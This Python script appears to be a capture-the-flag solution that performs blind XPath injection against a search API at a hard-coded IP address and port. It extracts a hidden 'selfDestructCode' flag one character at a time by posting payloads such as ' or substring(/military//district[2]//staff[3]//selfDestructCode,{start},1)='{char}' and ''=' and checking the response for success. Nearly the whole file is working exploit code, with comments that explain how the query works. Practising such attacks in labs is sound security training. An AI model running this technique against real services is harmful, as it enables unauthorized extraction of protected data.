import requests
import string

ip = "165.227.231.249"
port = "32444"

flag = ""

chars = string.ascii_letters + string.digits + "_$!@#&{}"

print("Flag: ", end='', flush=True)

def first_half(flag):
    for start in range(1, 30):
        for char in chars:

            """
            Query explanation:
            We start with the "military" tag, go to the second "district" tag, then to the third
            "staff" tag and then to the "selfDestructCode" tag, which has the first half of the flag.
            We pass this as an argument to the "substring" function, which retrieves characters based
            on the "start" and "end" arguments. We increase "start" in every loop and "end" remains the
            same because we are always retrieving one character. Finally, we check if the result of
            substring is equal to the current character (char)
            """
            payload_json = {
                "search": f"' or substring(/military//district[2]//staff[3]//selfDestructCode,{start},1)='{char}' and ''='"
            }

            if "success" in requests.post(f"http://{ip}:{port}/api/search", json=payload_json).text:
                print(char, end="", flush=True)
                flag += char

                # In order to check if we have retrieved all of the characters from the first half of the flag,
                # we retrieve all the characters from it and compare them to the flag we currently have
                payload_json = {
                    "search": f"' or substring(/military//district[2]//staff[3]//selfDestructCode,1)='{flag}' and ''='"
                }

                if "success" in requests.post(f"http://{ip}:{port}/api/search", json=payload_json).text:
                    return flag


def second_half(flag):
    for start in range(1, 30):
        for char in chars:
            payload_json = {
                "search": f"' or substring(/military//district[3]//staff[2]//selfDestructCode,{start},1)='{char}' and ''='"
            }

            result = requests.post(f"http://{ip}:{port}/api/search", json=payload_json)
            if "success" in result.text:
                print(char, end="", flush=True)
                flag += char

                # Since we know the flag ends with a "}", we don't need to do what we did with the first half
                if char == "}":
                    return flag
                continue

flag = first_half(flag)
flag = second_half(flag)
